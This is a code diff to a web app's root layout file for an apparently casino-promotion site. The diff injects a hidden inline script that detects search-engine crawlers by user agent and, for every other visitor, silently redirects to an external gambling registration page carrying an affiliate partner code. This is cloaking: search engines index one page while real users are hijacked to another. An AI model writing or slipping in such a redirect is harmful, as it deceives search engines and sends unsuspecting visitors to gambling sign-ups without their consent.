@@ -66,6 +66,21 @@ export default function RootLayout({
           content="https://bezdepcasino4.vercel.app/images/slip.jpg"
         />
         {/* дополнительные пользовательские теги */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p41618p7603");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="font-sans antialiased">{children}</body>
     </html>
